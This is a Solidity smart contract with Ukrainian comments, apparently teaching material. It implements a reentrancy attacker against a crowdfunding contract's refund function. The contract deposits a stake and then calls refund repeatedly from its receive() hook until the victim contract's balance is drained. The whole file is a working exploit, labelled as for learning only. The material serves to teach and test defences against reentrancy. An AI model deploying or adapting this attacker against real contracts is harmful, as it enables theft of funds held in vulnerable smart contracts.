// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

/// @dev Мінімальний інтерфейс жертви: підходить і для VulnerableCampaigns, і для Campaigns
interface IVictim {
    function contribute(uint256 id) external payable;

    function refund(uint256 id) external;
}

/// @title Контракт-атакувальник: повторний вхід у refund (ЛИШЕ ДЛЯ НАВЧАННЯ)
/// @notice Вносить невеликий внесок, а після провалу кампанії багаторазово викликає refund
contract ReentrancyAttacker {
    IVictim public immutable victim;
    uint256 public campaignId;
    uint256 public stake;

    constructor(IVictim victim_) {
        victim = victim_;
    }

    /// @notice Крок 1: робить власний внесок у кампанію
    function deposit(uint256 id) external payable {
        campaignId = id;
        stake = msg.value;
        victim.contribute{value: msg.value}(id);
    }

    /// @notice Крок 2: після провалу кампанії починає атаку
    function attack() external {
        victim.refund(campaignId);
    }

    /// @dev Спрацьовує, коли жертва надсилає ETH, і знову викликає refund, поки в жертви є кошти
    receive() external payable {
        if (address(victim).balance >= stake) {
            victim.refund(campaignId);
        }
    }
}
